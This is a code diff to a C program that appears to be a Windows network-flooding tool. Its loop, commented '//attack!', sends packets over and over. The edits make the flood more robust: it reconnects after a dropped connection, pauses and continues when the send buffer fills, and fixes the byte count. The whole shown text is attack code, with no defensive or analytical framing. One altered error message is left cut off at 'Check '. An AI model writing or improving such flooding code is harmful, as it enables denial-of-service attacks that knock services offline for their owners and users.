@@ -182,7 +182,7 @@ set:
 	//attack!
 	while (run)
 	{
-		data += sent = send(sock, (char*)info->pkg, info->pkg_size, 0);
+		sent = send(sock, (char*)info->pkg, info->pkg_size, 0);
 		pings++;
 		if (sent <= 0)
 		{
@@ -197,18 +197,24 @@ set:
 				We try to save the day!
 				If the connection is dead, we need to create a new one!
 				*/
-				run = true;
 				goto set;
 				break;
 			case WSAECONNREFUSED:
 				puts("\nA WSAECONNREFUSED error has occord.\nThe remote host refused to the connection.");
 				break;
+			case WSAENOBUFS:
+				//we just need to wait... the buffer will be empty...
+				Sleep(info->delay);
+				continue;
+				break;
 			default:
-				printf("\nError \'%u\' has occord.\n", res);
+				printf("\nError \'%u\' has occord.\nCheck ", res);
 			}
 			run = false;
 			exit(-1);
 		}
+		//we add sent to data after the error check just to make sure that sent is valid (not -1)
+		data += sent;
 		//sleep between packets
 		if (info->delay)
 			Sleep(info->delay);
